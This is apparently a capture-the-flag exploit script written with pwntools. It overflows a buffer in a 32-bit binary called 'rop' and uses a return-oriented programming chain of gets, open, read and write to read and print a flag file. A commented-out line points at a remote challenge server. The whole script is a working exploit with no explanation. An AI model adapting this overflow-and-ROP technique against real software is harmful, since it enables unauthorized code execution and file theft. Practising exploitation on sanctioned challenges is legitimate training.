from pwn import *
p = process('./rop') 
#p = remote('node3.buuoj.cn',26508)
elf = ELF('./rop')
pop_edx_ret = 0x806ecda
pop_ebx_pop_edx_ret = 0x806ecd9
pop_esi_pop_ebx_pop_edx_ret = 0x806ecd8

payload = 'a'*(0xc+4)
payload += p32(elf.sym['gets'])
payload += p32(pop_edx_ret)
payload += p32(elf.bss())
payload += p32(elf.sym['open'])
payload += p32(pop_ebx_pop_edx_ret)
payload += p32(elf.bss())
payload += p32(4)
payload += p32(elf.sym['read']) 
payload += p32(pop_esi_pop_ebx_pop_edx_ret) 
payload += p32(3)
payload += p32(elf.bss()) 
payload += p32(0x100) 
payload += p32(elf.sym['write']) 
payload += p32(0xdeadbeef) 
payload += p32(1) 
payload += p32(elf.bss()) 
payload += p32(0x100)

p.sendline(payload)
p.sendline('./flag')
p.interactive()